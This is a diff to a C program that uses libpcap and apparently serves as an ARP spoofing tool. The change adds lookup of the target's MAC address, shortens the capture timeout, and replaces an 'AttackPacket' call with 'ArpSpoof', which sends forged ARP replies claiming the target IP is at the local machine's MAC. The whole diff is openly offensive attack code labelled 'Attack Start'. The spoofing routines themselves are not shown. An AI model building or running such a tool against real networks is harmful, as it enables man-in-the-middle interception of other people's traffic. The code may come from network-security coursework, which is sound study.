@@ -5,6 +5,7 @@ int main(int argc, char** argv){
     char *dev;  /* device to communication */
     char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
     struct ether_addr LocalMac;   /* my mac address */
+    struct ether_addr TargetMac;
     struct ether_addr SenderMac;
     struct in_addr LocalIP, SenderIP, TargetIP;
     /* Check argument count */
@@ -31,7 +32,7 @@ int main(int argc, char** argv){
     printf("Target IP is %s\n",inet_ntoa(TargetIP));
 
     /* Open session in promiscuous mode */
-    if( (handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf)) == NULL){
+    if( (handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf)) == NULL){
         fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
         return 2;
     }
@@ -56,7 +57,7 @@ int main(int argc, char** argv){
     printf("Local Mac Address is %s\n",ether_ntoa(&LocalMac));
 
     printf("**********************************\n");
-    printf("Get Sender Mac Address...\n");
+    printf("Get Sender, Target Mac Address...\n");
 
     /* Get Sender Mac Address */
     if(GetSenderMac(handle, LocalMac, LocalIP, SenderIP, &SenderMac) != 1){
@@ -64,13 +65,20 @@ int main(int argc, char** argv){
         return 2;
     }
 
+    /* Get Target Mac Address */
+    if(GetSenderMac(handle, LocalMac, LocalIP, TargetIP, &TargetMac) != 1){
+        fprintf(stderr, "Couldn't Get Target Mac Address\n");
+        return 2;
+    }
+
     printf("Sender Mac Address is %s\n",ether_ntoa(&SenderMac));
+    printf("Target Mac Address is %s\n",ether_ntoa(&TargetMac));
     printf("**********************************\n");
     printf("Attack Start\n");
     printf("Generate Arp Reply Packet %s is at %s\n",inet_ntoa(TargetIP), ether_ntoa(&LocalMac));
 
     /* Generate Fake Arp Reply Packet and send */
-    if(AttackPacket(handle,SenderMac,LocalMac,TargetIP,SenderIP) != 1){
+    if(ArpSpoof(handle,SenderMac,LocalMac,TargetIP, TargetMac, SenderIP) != 1){
         fprintf(stderr, "Couldn't Attack\n");
         return 2;
     }
